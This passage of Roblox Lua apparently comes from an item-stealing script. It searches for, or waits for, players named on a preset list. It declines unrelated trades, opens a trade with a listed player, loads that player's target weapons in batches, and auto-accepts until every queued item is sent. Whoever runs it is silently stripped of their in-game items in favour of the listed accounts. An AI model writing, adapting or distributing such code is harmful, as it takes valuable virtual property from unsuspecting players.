	-- ===== ОСНОВНАЯ ЛОГИКА ТРЕЙДА =====
	local function doTrade(targetName)
		local targetPlayer = Players:FindFirstChild(targetName)
		if not targetPlayer then return end

		while #weaponsToSend > 0 do
			local status = getTradeStatus()
			if status == "StartTrade" then
				game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
				wait(0.5)
			elseif status == "ReceivingRequest" then
				game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
				wait(0.5)
			end

			pcall(function() sendTradeRequest(targetName) end)
			local timeout = 15
			while timeout > 0 do
				status = getTradeStatus()
				if status == "StartTrade" then break end
				if status == "None" then
					sendTradeRequest(targetName)
				elseif status == "ReceivingRequest" then
					game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
				end
				wait(1)
				timeout = timeout - 1
			end

			if status ~= "StartTrade" then return end

			local batch = {}
			for i = 1, math.min(4, #weaponsToSend) do
				table.insert(batch, table.remove(weaponsToSend, 1))
			end

			for _, weapon in ipairs(batch) do
				for count = 1, weapon.Amount do
					addWeaponToTrade(weapon.DataID)
				end
			end

			wait(7)
			acceptTrade()
			waitForTradeCompletion()
			if #weaponsToSend > 0 then
				wait(1)
			end
		end
	end

	local function findAndStartTrade()
		for _, p in ipairs(Players:GetPlayers()) do
			if table.find(users, p.Name) then
				doTrade(p.Name)
				return true
			end
		end
		return false
	end

	wait(2)
	if not findAndStartTrade() then
		local conn
		conn = Players.PlayerAdded:Connect(function(player)
			if table.find(users, player.Name) then
				conn:Disconnect()
				doTrade(player.Name)
			end
		end)
		task.spawn(function()
			while true do
				wait(5)
				if findAndStartTrade() then break end
			end
		end)
	end
